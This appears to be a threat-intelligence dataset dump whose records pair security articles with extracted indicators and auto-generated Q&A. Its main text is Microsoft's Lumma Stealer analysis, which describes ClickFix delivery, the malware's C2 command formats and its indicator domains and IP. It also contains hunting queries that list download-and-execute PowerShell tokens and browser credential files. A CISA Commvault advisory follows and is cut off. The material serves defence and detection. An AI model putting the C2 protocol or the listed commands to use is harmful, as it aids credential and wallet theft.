wallets like MetaMask, Electrum, and Exodus.", "question": "Is it related to wallet stealer?"}, {"answer": "Lumma Stealer steals various types of information, including browser credentials and cookies, cryptocurrency wallets and extensions, data from VPNs, email clients, and FTP clients, as well as user documents and system metadata.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is forwarded to the Lumma Stealer's command-and-control (C2) infrastructure, which uses a combination of hardcoded tier 1 C2s, fallback C2s hosted as Steam profiles and Telegram channels, and Cloudflare proxy to hide the real C2 servers.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations include organizations in Canada, and the malware targets various applications and data such as browsers, cryptocurrency wallets (e.g. MetaMask, Electrum, Exodus), and virtual private networks (VPNs). No specific bank names are mentioned in the context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.microsoft.com/en-us/security/blog/2025/05/21/lumma-stealer-breaking-down-the-delivery-techniques-and-capabilities-of-a-prolific-infostealer/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "check.foquh[.]icu"}, {"type": "Domain or URL", "value": "data-seed-prebsc-1-s1.bnbchain[.]org"}, {"type": "Domain or URL", "value": "binadata[.]com"}, {"type": "IP Address", "value": "185.147.125.174"}], "keywords_found": ["analysis", "threat", "fraud", "intelligence", "wallet", "apt", "infostealers", "phishing", "cybercrime", "malicious", "passwords", "cryptocurrency", "dropper", "browser"], "article_textual_content": "Lumma Stealer: Breaking down the delivery techniques and capabilities of a prolific infostealer | Microsoft Security BlogShareTagsCredential theftStormContent typesResearchProducts and servicesMicrosoft DefenderMicrosoft Defender for EndpointMicrosoft Defender for Office 365Microsoft Defender XDRMicrosoft security expertsTopicsThreat intelligenceOver the past year, Microsoft observed the persistent growth and operational sophistication of Lumma Stealer, an infostealer malware used by multiple financially motivated threat actors to target various industries. Our investigation into Lumma Stealer’s distribution infrastructure reveals a dynamic and resilient ecosystem that spans phishing, malvertising, abuse of trusted platforms, and traffic distribution systems. These findings underscore the importance of collaborative efforts to disrupt cybercrime. Microsoft, partnering with others across industry and international law enforcement, recently facilitated adisruption of Lumma infrastructure.Lumma Stealer (also known as LummaC2) is a malware as a service (MaaS) offering that is capable of stealing data from various browsers and applications such as cryptocurrency wallets and installing other malware. Microsoft Threat Intelligence tracks the threat actor who developed and maintains the Lumma malware, command-and-control (C2) infrastructure, and the Lumma MaaS as Storm-2477. Affiliates who pay Storm-2477 for the service and operate their own Lumma campaigns access a panel to build the malware binary and manage the C2 communications and stolen information. We have observed ransomware threat actors like Octo Tempest, Storm-1607, Storm-1113, and Storm-1674 using Lumma Stealer in campaigns.Unlike earlier infostealers that relied heavily on bulk spam or exploits, Lumma Stealer exemplifies a shift toward multi-vector delivery strategies. Its operators demonstrate resourcefulness and proficiency in impersonation tactics. The Lumma Stealer distribution infrastructure is flexible and adaptable. Operators continually refine their techniques, rotating malicious domains, exploiting ad networks, and leveraging legitimate cloud services to evade detection and maintain operational continuity. This dynamic structure enables operators to maximize the success of campaigns while complicating efforts to trace or dismantle their activities.The growth and resilience of Lumma Stealer highlights the broader evolution of cybercrime and underscores the need for layered defenses and industry collaboration to counter threats. In this blog post, we share our analysis of Lumma Stealer and its infrastructure and provide guidance on how users and organizations can protect themselves from this threat. Microsoft remains committed to sharing insights, developing protections, and working with partners across industries to disrupt malicious ecosystems and safeguard users worldwide.Figure 1. Heat map detailing global spread of Lumma Stealer malware infections and encounters across Windows devices.Lumma Stealer delivery techniquesLumma Stealer leverages a broad and evolving set of delivery vectors. Campaigns often combine multiple techniques, dynamically adapting to evade detection and increase infection success rates. Delivery infrastructure is designed to be ephemeral, shifting rapidly across domains, platforms, and geographies to avoid takedowns.Phishing emails: Lumma Stealer emails impersonate known brands and services to deliver links or attachments. These campaigns involve expertly crafted emails designed to evoke urgency, often masquerading as urgent hotel reservation confirmations or pending cancellations. The emails lead victims to cloned websites or malicious servers that deploy the Lumma payload to the targets’ environment.Malvertising: Threat actors inject fake advertisements into search engine results, targeting software-related queries such as “Notepad++ download” or “Chrome update.” Clicking these poisoned links leads users to cloned websites that closely mimic legitimate vendors but instead deliver the Lumma Stealer.Drive-by download on compromised websites: Threat actors were observed compromising groups of legitimate websites, typically through a particular vulnerability or misconfiguration. They modify site content by inserting malicious JavaScript. The JavaScript runs when sites are visited by unsuspecting users, leading to delivery of a payload, intermediary script, or displaying further lures to convince users to perform an action.Trojanized applications: In many campaigns, cracked or pirated versions of legitimate applications are bundled with Lumma binaries and distributed through file-sharing platforms. These modified installers often contain no visible payload during installation, executing the malware silently post-launch.Abuse of legitimate services and ClickFix: Public repositories like GitHub are abused and populated with scripts and binaries, often disguised as tools or utilities. A particularly deceptive method involves fake CAPTCHA pages, commonly observed in the ClickFix ecosystem. Targets are instructed to copy malicious commands into their system’sRunutility under the pretense of passing a verification check. These commands often download and execute Lumma directly in memory, using Base64 encoding and stealthy delivery chains.Dropped by other malware: Microsoft Threat Intelligence observed other loaders and malware such as DanaBot delivering Lumma Stealer as an additional payload.All these mechanisms reflect threat actor behavior that prioritizes abuse of user trust, manipulation of legitimate infrastructure, and multi-layered distribution chains designed to evade both technical and human defenses. The following sections discuss some examples of campaigns where the mentioned distribution methods were used to deliver Lumma Stealer.Drive-by download campaign leveraging EtherHiding and ClickFix to deliver LummaIn early April 2025, Microsoft observed a cluster of compromised websites leveraging EtherHiding and ClickFix techniques to install Lumma Stealer. EtherHiding is a technique that involves leveraging smart contracts on blockchain platforms like Binance Smart Chain (BSC) to host parts of malicious code. Traditional methods of blocking malicious code, such as IP or domain blocking or content-based detections, are less effective against EtherHiding because the code is embedded in the blockchain. Meanwhile, in the ClickFix technique, a threat actor attempts to take advantage of human problem-solving tendencies by displaying fake error messages or prompts that instruct target users to fix issues by copying, pasting, and launching commands that eventually result in the download of malware.Figure 2. Attack flow for ClickFix to Lumma StealerIn this campaign, the JavaScript injected into compromised websites directly contacted BSC to retrieve the ClickFix code and lure, which was then presented to the target. Users needed to click the “I’m not a robot” prompt, at which point a command was copied into their clipboard. Users were then instructed to paste and launch this command via the WindowsRunprompt. The command downloaded and initiated further code usingmshtafromcheck.foquh[.]icu.Figure 3. Compromised website used EtherHiding and ClickFix techniques to present a fake CAPTCHA lure to visitorsFigure 4. Snippet of the injected JavaScript after Base64 decoding. It implements the EtherHiding technique and communicates with data-seed-prebsc-1-s1.bnbchain[.]org to fetch ClickFix code.Figure 5. This fake verification page is the final part of the ClickFix technique. It instructs users how to launch a malicious command. The command was silently copied into their clipboard during the previous step when they clicked “I’m not a robot”.Email campaign targeting organizations in Canada to deliver Lumma StealerOn April 7, 2025, Microsoft Threat Intelligence observed an email campaign consisting of thousands of emails targeting organizations in Canada. The emails used invoice lures for a fitness plan or an online education platform. The emails’ subject lines were personalized to include recipient-specific details such as “Invoice for [recipient email]”. Notably, the attack chain utilized multiple tools available for purchase on underground forums for traffic filtering and social engineering.The emails contained URLs leading to thePrometheus traffic direction system (TDS)hosted on numerous compromised sites. The TDS in turn, redirected users to the attacker-controlled websitebinadata[.]comthat hosted the ClickFix social engineering framework. Like the previous campaign, targets were instructed to click a “I’m not a robot” prompt and run malicious code via a multi-step process. The malicious code was anmshtacommand that downloaded and executed JavaScript from the IP address 185.147.125[.]174. The JavaScript ran a PowerShell command that downloaded more PowerShell code, which finally downloaded and launched a Lumma Stealer executable. Notably, Xworm malware was also bundled into this executable.Figure 6. Attack flow for ClickFix leading to Lumma Stealer targeting users in CanadaFigure 7. Fitness plan subscription themed email lureFigure 8. Screenshot of the ClickFix landing after Prometheus TDS redirectionLumma Stealer malware analysisThe core Lumma Stealer malware is written in a combination of C++ and ASM. The malware author designed it as a MaaS offering. Threat actors can access the panel to build the malware binary and manage the C2 communications and stolen information. The core binary is obfuscated with advanced protection such as low-level virtual machine (LLVM core), Control Flow Flattening (CFF), Control Flow Obfuscation, customized stack decryption, huge stack variables, and dead codes, among others. These techniques are implemented on the critical functions to make static analysis difficult, as these can cause tools like Hex-Rays’ IDA fail to produce equivalent decompiled codes. In addition, most of the critical APIs are implemented via low-level syscalls and Heavens Gate Technology.Lumma Stealer is designed to steal from browsers based on Chromium and Mozilla technology, including Microsoft Edge. In addition, it has the capability to install other malware or plugins, including Clipboard stealer plugin and coin miners, either by downloading to disk or directly in memory.Process injection and process hollowingLumma loader may use process hollowing to inject its malicious payload into legitimate system processes likemsbuild.exe,regasm.exe,regsvcs.exe, andexplorer.exe. This technique enables execution under the guise of a trusted binary to bypass behavioral detection and endpoint monitoring tools.Information-stealing capabilitiesLumma Stealer targets a comprehensive set of user data using a specialized collection routine for each type of data. These capabilities have evolved over time, and Microsoft Threat Intelligence has recently observed that the instructions for the target credentials are specified in the configuration file retrieved from the active C2 server. The configuration file is divided into several parts: the “ex” section that pertains to the target list of apps for cryptocurrency wallets and extensions, and “c” sections that pertain to the list of applications and configuration details for browsers, user file’s locations, and other applications.Browser credentials and cookies:Lumma Stealer extracts saved passwords, session cookies, and autofill data from Chromium (including Edge), Mozilla, and Gecko-based browsers.Cryptocurrency wallets and extensions:Lumma Stealer actively searches for wallet files, browser extensions, and local keys associated with wallets like MetaMask, Electrum, and Exodus.Various applications:Lumma Stealer targets data from various virtual private networks (VPNs) (.ovpn), email clients, FTP clients, and Telegram applications.User documents:Lumma Stealer harvests files found on the user profiles and other common directories, especially those with .pdf, .docx, or .rtfextensions.System metadata:Lumma Stealer collects host telemetry such as CPU information, OS version, system locale, and installed applications for tailoring future exploits or profiling victims.Figure 9. Lumma Stealer configuration fileC2 communicationLumma Stealer maintains a robust C2 infrastructure, using a combination of hardcoded tier 1 C2s that are regularly updated and reordered, and fallback C2s hosted as Steam profiles and Telegram channels that also point to the tier 1 C2s. The Telegram C2, if available, is always checked first, while the Steam C2 is checked only when all the hardcoded C2s are not active. To further hide the real C2 servers, all the C2 servers are hidden behind the Cloudflare proxy.While Lumma Stealer affiliates share the tier 1 C2s, there is a capability to add a personal tier 1 C2 domain for an extra cost. The diagram below shows an overview of the Lumma Stealer infrastructure. All traffic is encrypted by HTTPS.Figure 10. Lumma Stealer C2 communicationDifferent types of obfuscation are applied to each set of C2 servers. For example, the hardcoded list of C2s, and including the Telegram fallback C2 URL are protected with ChaCha20 crypto, while the Steam profile fallback C2 URL is encrypted using custom stack-based crypto algorithm that can change on each version of Lumma malware.We have identified up to six versions of Lumma Stealer, and while each of these versions focuses on improving techniques to evade antivirus detections, there are also several changes in the C2 communication protocol and formats such as the C2 domains, URI path, POST data, and others. The core Lumma malware stores the build date as part of the embedded configuration to keep track of improvements, but in our investigation, we tracked major changes using the labels “version 1” through “version 6”.Lumma Stealer keeps track of the active C2 for sending the succeeding commands. Each command is sent to a single C2 domain that is active at that point. In addition, each C2 command contains one or more C2 parameters specified as part of the POST data as form data. The parameters are:act:Indicates the C2 command. Note: This C2 parameter no longer exists in Lumma version 6.ver:Indicates C2 protocol version. This value is always set to 4.0 and has never changed since the first version Lumma.lid(for version 5 and below)/uid(for version 6): This ID identifies the Lumma client/operator and its campaign.j(for version 5 and below )/cid(for version 6): This is an optional field that identifies additional Lumma features.hwid: Indicates the unique identifier for the victim machine.pid: Used in SEND_MESSAGE command to identify the source of the stolen data. A value of 1, indicates it came from the Lumma core process.The following are some of the most common Lumma Stealer C2 commands and associated parameters:PING / LIFE: Initial command to check if the C2 is active. Note: This command does not exist in version 6.act=lifeRECEIVE_MESSAGE: Command to download the stealer’s configuration. As noted above, this contains the specifications on the list of targets.version 3 and below:act=recive_message&ver=4.0&lid=[<lid_value>]&j=[<j_value>]version 4 and 5:act=receive_message&ver=4.0&lid=[<lid_value>]&j=[<j_value>]version 6:uid=<uid_value>&cid=[<cid_value>]SEND_MESSAGE: Command to send back stolen data in chunks. The C2 parameters are specified as individual section in the whole POST data. The fields included areact=send_message,hwid,pid,lid/uid, andj/cid. Theactfield was removed in version 6.GET_MESSAGE: Command to download the second configuration. This configuration contains information about the plugins and additional malware to install on the target systems. We have observed that in most cases this command will respond with valid but empty records “[]”, meaning nothing to download. So far, we have observed Lumma Stealer installing an updated version of the Clipboard stealer plugin and coin miners.versions 5 and below:act=get_message&ver=4.0&lid=[<lid_value>]&j=[<j_value>]&hwid=<hwid_value>version 6:uid=<uid_value>&cid=[<cid_value>]&hwid=<hwid_value>Microsoft Digital Crimes Unit (DCU) engineered tools that identify and map the Lumma Stealer C2 infrastructure. As part of the disruption announced on May 21, Microsoft’s DCU has facilitated the takedown, suspension, and blocking of approximately 2,300 malicious domains that formed the backbone of the Lumma Stealer infrastructure.  More details of this operation are presented in theDCU disruption announcement.RecommendationsMicrosoft Threat Intelligence recommends the following mitigations to reduce the impact of this threat.Strengthen Microsoft Defender for Endpoint configurationEnsure thattamper protectionis enabled in Microsoft Defender for Endpoint.Enablenetwork protectionin Microsoft Defender for Endpoint.Turn onweb protection.Runendpoint detection and response (EDR) in block modeso that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus does not detect the threat or when Microsoft Defender Antivirus is running in passive mode. EDR in block mode works behind the scenes to remediate malicious artifacts that are detected post-breach.Configureinvestigation and remediationin full automated mode to let Microsoft Defender for Endpoint take immediate action on alerts to resolve breaches, significantly reducing alert volume.Microsoft Defender XDR customers can turn on the followingattack surface reduction rulesto prevent common attack techniques used by threat actors.Blockexecutable files from running unless they meet a prevalence, age, or trusted list criterionBlockexecution of potentially obfuscated scriptsBlockJavaScript or VBScript from launching downloaded executable contentBlockprocess creations originating from PSExec and WMI commandsBlockcredential stealing from the Windows local security authority subsystemBlockuse of copied or impersonated system toolsStrengthen operating environment configurationRequiremultifactor authentication (MFA). While certain attacks such as adversary-in-the-middle (AiTM) phishing attempt to circumvent MFA, implementation of MFA remains an essential pillar in identity security and is highly effective at stopping a variety of threats.Leveragephishing-resistant authentication methodssuch as FIDO Tokens, orMicrosoft Authenticatorwith passkey. Avoid telephony-based MFA methods to avoid risks associated with SIM-jacking.Implement Entra IDConditional Access authentication strengthto require phishing-resistant authentication for employees and external users for critical apps.Encourage users to use Microsoft Edge withMicrosoft Defender SmartScreen, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that host malware.EnableNetwork Level Authenticationfor Remote Desktop Service connections.EnableLocal Security Authority (LSA) protection to block credential stealing from the Windows local security authority subsystem.AppLockercan restrict specific software tools prohibited within the organization, such as reconnaissance, fingerprinting, and RMM tools, or grant access to only specific users.Detection detailsMicrosoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog.Customers with provisioned access can also useMicrosoft Security Copilot in Microsoft Defenderto investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.Microsoft Defender AntivirusMicrosoft Defender Antivirus detects this threat as the following malware:Behavior:Win32/LuammaStealerTrojan:JS/LummaStealerTrojan:MSIL/LummaStealerTrojan:Win32/LummaStealerTrojan:Win64/LummaStealerTrojanDropper:Win32/LummaStealerTrojan:PowerShell/PowdowTrojan:Win64/ShaolaodBehavior:Win64/ShaolaodBehavior:Win32/MaleficAmsBehavior:Win32/ClickFixBehavior:Win32/SuspClickFixTrojan:Win32/ClickFixTrojan:PowerShell/ClickFixObfusBehavior:Win32/RegRunMRUTrojan:HTML/FakeCaptchaTrojan:Script/SuspDownMicrosoft Defender for EndpointThe following Microsoft Defender for Endpoint alerts might also indicate threat activity related to this threat. Note, however, that these alerts can be also triggered by unrelated threat activity:Suspicious command in RunMRU registryPossible Lumma Stealer activityInformation stealing malware activitySuspicious PowerShell command lineUse of living-off-the-land binary to run malicious codePossible theft of passwords and other sensitive web browser informationSuspicious DPAPI ActivitySuspicious mshta process launchedRenamed AutoIt toolSuspicious phishing activity detectedSuspicious implant process from a known emerging threatA process was injected with potentially malicious codeProcess hollowing detectedSuspicious PowerShell download or encoded command executionA process was launched on a hidden desktopMicrosoft Defender for Office 365Microsoft Defender for Office 365 identifies and blocks malicious emails. These alerts, however, can also be triggered by unrelated threat activity:A potentially malicious URL click was detectedEmail messages containing malicious URL removed after deliveryEmail messages removed after deliveryA user clicked through to a potentially malicious URLSuspicious email sending patterns detectedEmail reported by user as malware or phishDefender for Office 365 also detects and blocks Prometheus TDS, EtherHiding patterns, ClickFix landing pages.Microsoft Security CopilotSecurity Copilot customers can use the standalone experience tocreate their own promptsor run the followingpre-built promptbooksto automate incident response or investigation tasks related to this threat:Incident investigationMicrosoft User analysisThreat actor profileThreat Intelligence 360 report based on MDTI articleVulnerability impact assessmentNote that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel.Threat intelligence reportsMicrosoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments.Microsoft Defender Threat IntelligenceStorm-1865 phishing campaigns over vendor platforms lead to payment data theft and fraudulent chargesLumma StealerMalvertising campaign leads to info stealers hosted on GitHubClickFix technique leverages clipboard to run malicious commandsMicrosoft Security Copilot customers can also use theMicrosoft Security Copilot integrationin Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in theembedded experiencein the Microsoft Defender portal to get more information about this threat actor.Hunting queriesMicrosoft Defender XDRMicrosoft Defender XDR customers can run the following query to find related activity in their networks:ClickFix commands executionIdentify ClickFix commands execution.DeviceRegistryEvents\n| where ActionType =~ \"RegistryValueSet\"\n| where InitiatingProcessFileName =~ \"explorer.exe\"\n| where RegistryKey has @\"\\CurrentVersion\\Explorer\\RunMRU\"\n| where RegistryValueData has \"✅\"\n        or (RegistryValueData has_any (\"powershell\", \"mshta\", \"curl\", \"msiexec\", \"^\")\n             and RegistryValueData matches regex \"[\\u0400-\\u04FF\\u0370-\\u03FF\\u0590-\\u05FF\\u0600-\\u06FF\\u0E00-\\u0E7F\\u2C80-\\u2CFF\\u13A0-\\u13FF\\u0530-\\u058F\\u10A0-\\u10FF\\u0900-\\u097F]\")\n        or (RegistryValueData has \"mshta\" and RegistryValueName !~ \"MRUList\" and RegistryValueData !in~ (\"mshta.exe\\\\1\", \"mshta\\\\1\"))\n        or (RegistryValueData has_any (\"bitsadmin\", \"forfiles\", \"ProxyCommand=\") and RegistryValueName !~ \"MRUList\")\n        or ((RegistryValueData startswith \"cmd\" or RegistryValueData startswith \"powershell\")\n            and (RegistryValueData has_any (\"-W Hidden \", \" -eC \", \"curl\", \"E:jscript\", \"ssh\", \"Invoke-Expression\", \"UtcNow\", \"Floor\", \"DownloadString\", \"DownloadFile\", \"FromBase64String\",  \"System.IO.Compression\", \"System.IO.MemoryStream\", \"iex\", \"Invoke-WebRequest\", \"iwr\", \"Get-ADDomainController\", \"InstallProduct\", \"-w h\", \"-X POST\", \"Invoke-RestMethod\", \"-NoP -W\", \".InVOKe\", \"-useb\", \"irm \", \"^\", \"[char]\", \"[scriptblock]\", \"-UserAgent\", \"UseBasicParsing\", \".Content\")\n              or RegistryValueData matches regex @\"[-/–][Ee^]{1,2}[NnCcOoDdEeMmAa^]*\\s[A-Za-z0-9+/=]{15,}\"))DPAPI decryption via AutoIT or .NET Framework processesIdentify DPAPI decryption activity originating from AutoIT scripts .NET Framework processes.DeviceEvents\n| where ActionType == \"DpapiAccessed\"\n| where InitiatingProcessVersionInfoInternalFileName == \"AutoIt3.exe\"\n      or InitiatingProcessImageFilePath has \"\\\\windows\\\\microsoft.net\\\\framework\\\\\"\n      or InitiatingProcessFileName =~ \"powershell.exe\"\n| where (AdditionalFields has_any(\"Google Chrome\", \"Microsoft Edge\") and AdditionalFields has_any(\"SPCryptUnprotect\"))\n| extend json = parse_json(AdditionalFields)\n| extend dataDesp = tostring(json.DataDescription.PropertyValue)\n| extend opType = tostring(json.OperationType.PropertyValue)\n| where dataDesp in~ (\"Google Chrome\", \"Microsoft Edge\", \"Chromium\", \"Opera\", \"Opera GX\", \"IMAP Password\", \"Brave Browser\", \"AVG Secure Browser\") \n        and opType =~ \"SPCryptUnprotect\"\n| project Timestamp, ReportId, DeviceId, ActionType, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessVersionInfoInternalFileName, InitiatingProcessCommandLine, AdditionalFields, dataDesp, opTypeSensitive browser file access via AutoIT or .NET Framework processesIdentify .NET Framework processes (such asRegAsm.exe,MSBuild.exe, etc.) accessing sensitive browser files.let browserDirs = pack_array(@\"\\Google\\Chrome\\User Data\\\", @\"\\Microsoft\\Edge\\User Data\\\", @\"\\Mozilla\\Firefox\\Profiles\\\"); \nlet browserSensitiveFiles = pack_array(\"Web Data\", \"Login Data\", \"key4.db\", \"formhistory.sqlite\", \"cookies.sqlite\", \"logins.json\", \"places.sqlite\", \"cert9.db\");\nDeviceEvents\n| where AdditionalFields has_any (\"FileOpenSource\") // Filter for \"File Open\" events.\n| where InitiatingProcessVersionInfoInternalFileName == \"AutoIt3.exe\"\n      or InitiatingProcessImageFilePath has \"\\\\windows\\\\microsoft.net\\\\framework\\\\\"\n      or InitiatingProcessFileName =~ \"powershell.exe\"\n| where (AdditionalFields has_any(browserDirs) or  AdditionalFields has_any(browserSensitiveFiles)) \n| extend json = parse_json(AdditionalFields)\n| extend File_Name = tostring(json.FileName.PropertyValue)\n| where (File_Name has_any (browserDirs) and File_Name has_any (browserSensitiveFiles))\n| project Timestamp, ReportId, DeviceId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessVersionInfoInternalFileName, InitiatingProcessCommandLine, File_NameLearn moreFor the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog:https://aka.ms/threatintelblog.To get notified about new publications and to join discussions on social media, follow us on LinkedIn athttps://www.linkedin.com/showcase/microsoft-threat-intelligence, on X (formerly Twitter) athttps://x.com/MsftSecIntel, and Bluesky athttps://bsky.app/profile/threatintel.microsoft.com.To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the Microsoft Threat Intelligence podcast:https://thecyberwire.com/podcasts/microsoft-threat-intelligence.Follow on XFollow on LinkedInMicrosoft Threat IntelligenceSee more articles from this authorRelated postsMay 12, 202510 min readMarbled Dust leverages zero-day in Output Messenger for regional espionageSince April 2024, the threat actor that Microsoft Threat Intelligence tracks as Marbled Dust has been observed exploiting user accounts that have not applied fixes to a zero-day vulnerability (CVE-2025-27920) in the messaging app Output Messenger, a multiplatform chat software.May 1, 20259 min readAnalyzing CVE-2025-31191: A macOS security-scoped bookmarks-based sandbox escapeMicrosoft uncovered a vulnerability in macOS that could allow specially crafted codes to escape the App Sandbox and run unrestricted on the system.April 23, 202514 min readUnderstanding the threat landscape for Kubernetes and containerized assetsThe dynamic nature of containers can make it challenging for security teams to detect runtime anomalies or pinpoint the source of a security incident, presenting an opportunity for attackers to stay undetected."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://blog.eclecticiq.com/china-nexus-threat-actor-actively-exploiting-ivanti-endpoint-manager-mobile-cve-2025-4428-vulnerability", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.akamai.com/blog/security/2025/may/forget-perfect-prevention-build-cyber-resilience-instead", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/gitlab-duo-vulnerability-enabled.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.cisa.gov/news-events/alerts/2025/05/22/advisory-update-cyber-threat-activity-targeting-commvaults-saas-cloud-application-metallic", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The answer cannot be determined from the provided context.", "question": "What kind of malware is it?"}, {"answer": "The attack involves cyber threat activity targeting Commvault's SaaS cloud application, specifically accessing client secrets for Microsoft 365 backup software-as-a-service solution. It appears to be part of a larger campaign targeting SaaS companies' cloud applications with default configurations and elevated permissions.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The threat actors may have accessed client secrets for Commvault's Microsoft 365 backup software-as-a-service solution, allowing unauthorized access to customers' M365 environments. This includes application secrets stored by Commvault.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.cisa.gov/news-events/alerts/2025/05/22/advisory-update-cyber-threat-activity-targeting-commvaults-saas-cloud-application-metallic", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "https://learn.microsoft.com/en-us/azure/active-directory/workload-identities"}, {"type": "Domain or URL", "value": "https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth-ropc"}, {"type": "Domain or URL", "value": "https://docs.microsoft.com/en-us/graph/api/resources/serviceprincipal"}, {"type": "Domain or URL", "value": "https://www.microsoft.com/en-us/microsoft-365"}, {"type": "Domain or URL", "value": "https://www.microsoft.com/en-us/microsoft-365/business"}, {"type": "Domain or URL", "value": "https://cisa.gov"}, {"type": "Domain or URL", "value": "https://www.commvault.com"}, {"type": "Domain or URL", "value": "https://Report@cisa.gov"}, {"type": "Domain or URL", "value": "https://www.facebook.com"}, {"type": "Domain or URL", "value": "https://www.linkedin.com"}, {"type": "Domain or URL", "value": "https://www.youtube.com"}, {"type": "Domain or URL", "value": "https://www.instagram.com"}, {"type": "Domain or URL", "value": "https://www.rss.com"}, {"type": "Domain or URL", "value": "https://www.dhs.gov"}, {"type": "Domain or URL", "value": "https://www.usa.gov"}, {"type": "Domain or URL", "value": "https://www.whitehouse.gov"}], "keywords_found": ["threat", "malicious"], "article_textual_content": "# Advisory Update on Cyber Threat Activity Targeting Commvault’s SaaS Cloud Application (Metallic)\n\nRelease Date\n\nCommvault is monitoring cyber threat activity targeting their applications hosted in their Microsoft Azure cloud environment. Threat actors may have accessed client secrets for Commvault’s (Metallic) Microsoft 365 (M365) backup software-as-a-service (SaaS) solution, hosted in Azure. This provided the threat actors with unauthorized access to Commvault’s customers’ M365 environments that have application secrets stored by Commvault.\n\nSee the following resource for more information: Notice: Security Advisory (Update).\n\nCISA believes the threat activity may be part of a larger campaign targeting various SaaS companies’ cloud applications with default configurations and elevated permissions.\n\nCISA urges users and administrators to review the following mitigations and apply necessary patches and updates for all systems:\n\n1. Monitor Entra audit logs for unauthorized modifications or additions of credentials to service principals initiated by Commvault applications/service principals.\n    1. Handle deviations from regular login schedules as suspicious.\n    2. For more information, see NSA and CISA’s Identity Management guidance, as well as CISA’s guidance on Identity, Credential, and Access Management (ICAM) Reference Architecture.\n2. Review Microsoft logs (Entra audit, Entra sign-in, unified audit logs) and conduct internal threat hunting in alignment with documented organizational incident response polices.\n3. (Applies to single tenant apps only ) Implement a conditional access policy that limits authentication of an application service principal to an approved IP address that is listed within Commvault’s allowlisted range of IP addresses.\n    1. Note: A Microsoft Entra Workload ID Premium License is required to apply conditional access policies to an application service principal and is available to customers at an additional cost.[1]\n4. For certain Commvault customers, rotate their application secrets, rotate those credentials on Commvault Metallic applications and service principles available between February and May 2025.[2 ] Note : This mitigation only applies to a limited number of customers who themselves have control over Commvault’s application secrets.\n    1. Customers who have the ability to, if applicable, should establish a policy to regularly rotate credentials at least every 30 days.\n5. Review the list of Application Registrations and Service Principals in Entra with administrative consent for higher privileges than the business need.\n6. Implement general M365 security recommendations outlined in CISA’s Secure Cloud Business Applications (SCuBA) Project.\n\n##### Precautionary Recommendations for On-premises Software Versions\n\n1. Where technically feasible, restrict access to Commvault management interfaces to trusted networks and administrative systems.\n2. Detect and block path-traversal attempts and suspicious file uploads by deploying a Web Application Firewall and removing external access to Commvault applications [CSA-250502].\n3. Apply the patches provided [3 ] and follow these best practices [4 ].\n    1. Especially monitor activity from unexpected directories, particularly web-accessible paths.\n\nCISA added CVE-2025-3928 to the Known Exploited Vulnerabilities Catalog and is continuing to investigate the malicious activity in collaboration with partner organizations.\n\n### References\n\n[1] Workload identities - Microsoft Entra Workload ID | Microsoft Learn\n\n[2] Change a Client Secret for the Azure App for OneDrive for 